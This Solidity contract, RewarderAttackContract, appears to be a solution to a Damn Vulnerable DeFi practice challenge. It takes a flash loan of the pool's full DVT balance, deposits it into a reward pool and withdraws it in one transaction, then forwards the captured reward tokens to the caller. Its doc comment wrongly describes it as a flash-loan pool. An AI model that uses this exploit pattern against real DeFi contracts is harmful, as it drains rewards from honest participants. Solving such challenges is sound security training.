// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "./FlashLoanerPool.sol";
import "./TheRewarderPool.sol";

/**
 * @title RewarderAttackContract
 * @author Edoardo Ierina

 * @dev A simple pool to get flash loans of DVT
 */
contract RewarderAttackContract {

    IERC20 private rewardToken;
    IERC20 private liquidityToken;    
    FlashLoanerPool private flashPool;
    TheRewarderPool private rewardPool;

    constructor(address rewardTokenAddress, address liquidityTokenAddress, address flashPoolAddress, address rewarderPoolAddress) {
        rewardToken = IERC20(rewardTokenAddress);
        liquidityToken = IERC20(liquidityTokenAddress);
        flashPool = FlashLoanerPool(flashPoolAddress);
        rewardPool = TheRewarderPool(rewarderPoolAddress);
    }

    function receiveFlashLoan(uint256 amount) external {
        require(msg.sender == address(flashPool));
        liquidityToken.approve(address(rewardPool), amount);
        rewardPool.deposit(amount);
        rewardPool.withdraw(amount);
        require(liquidityToken.transfer(msg.sender, amount));
    }

    function attack() external {
        uint256 poolBalance = liquidityToken.balanceOf(address(flashPool));
        flashPool.flashLoan(poolBalance);        
        uint256 rewardsBalance = rewardToken.balanceOf(address(this));
        require(rewardToken.transfer(msg.sender, rewardsBalance));
    }
}
